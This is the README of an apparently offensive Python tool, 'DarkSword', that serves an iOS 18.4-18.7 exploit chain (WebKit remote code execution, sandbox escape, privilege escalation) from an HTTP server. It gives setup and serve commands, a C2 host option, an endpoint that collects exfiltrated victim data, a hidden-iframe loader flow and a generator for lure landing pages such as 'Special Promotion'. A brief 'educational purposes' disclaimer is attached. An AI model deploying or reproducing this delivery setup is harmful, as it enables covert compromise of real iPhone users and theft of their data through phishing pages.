# DarkSword EN

Python framework with CLI for delivery of the **DarkSword** exploit chain. Based on the [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE), [darksword-kexploit](https://github.com/opa334/darksword-kexploit) and [darksword](https://github.com/bhideki/darksword).

> **Warning**: This repository is for educational purposes only.

## References

- [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
- Currently iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)

## Installation and Setup

```bash
git clone https://github.com/bhideki/darksword.git
cd darksword
pip install -e .
```

## Quick Use

```bash
darksword serve
```

Access from an iOS device (Safari): `http://<YOUR_IP>:8080/`

Payloads and kexploit already included. To update: `darksword sync` and `darksword sync-kexploit`

## Client Commands

| Command | Description |

|---------|-----------|

| `darksword serve` | Starts HTTP server for exploit delivery |

| `darksword sync` | Downloads payloads from the DarkSword-RCE repository |

| `darksword list` | Lists locally available payloads |

| `darksword info` | Displays information about the chain and CVEs |

| `darksword template generate` | Generates a custom landing page |

| `darksword template list` | Lists available templates |

| `darksword sync-kexploit` | Downloads kernel exploit (opa334, Objective-C) |

### `serve` Command

```
darksword serve -H 0.0.0.0 -p 8080
darksword serve -p 8443 --c2-host https://your-c2.com/payload
```

- `-H, --host`: Host (default: 0.0.0.0)
- `-p, --port` A: Door (Default: 8080)
- `--c2-host`: Custom C2 (e.g., ) - overwrites host/port on pe_main.

- `--redirect`: Fallback redirect URL

Without `--c2-host`, the host/port is obtained from the Host header (same server). Exfiled data goes to `exfil/` and POST `/upload`.

### Generate a custom landing page

```bash
darksword template generate --title "Special Promotion" --redirect https://site-legitimo.com
```

## Project Structure

```
DarkSword/
├── darksword/ # Python Module
│ ├── cli.py # Main CLI
│ ├── server.py # HTTP Server
│ ├── payloads.py # Payload Sync and Management
│ └── config.py
├── payloads/ # Web Payloads (after darksword sync)
├── templates/ # Landing Page Templates
├── kexploit/ # Kernel exploit Obj-C (after darksword) sync-kexploit)
├── pyproject.toml
└── README.md
```

### Repos check

| Repo | Files |
|------|----------|
| **htimesnine/DarkSword-RCE** | index.html, frame.html, rce_loader.js, rce_module*.js, rce_worker*.js, sbx*.js, pe_main.js |
| **ghh-jb/DarkSword** | Identical (fallback) |
| **opa334/darksword-kexploit** | Makefile, src/main.m, entitlements.plist |
| **Not public** | rce_worker_18.7.js (iOS 18.7) |

## DarkSword Chain Flow

1. **index.html** → Landing page loads frame.html in a hidden iframe
2. **frame.html** → Injects rce_loader.js
3. **rce_loader.js** → Loads RCE modules according to the iOS version
4. **rce_module.js / rce_module_18.6.js** → RCE modules
5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (JSC exploits)
6. **sbx0_main_18.4.js / sbx1_main.js** → Sandbox escape
7. **pe_main.js** → Privilege escalation

## Ethical Requirements

- **Authorization**: Use only against systems you have permission for Explicit for testing
- **Scope**: Respect the limits defined in the engagement contract/scope
- **Documentation**: Record all activities 

## License

MIT - For authorized educational and security testing purposes only.
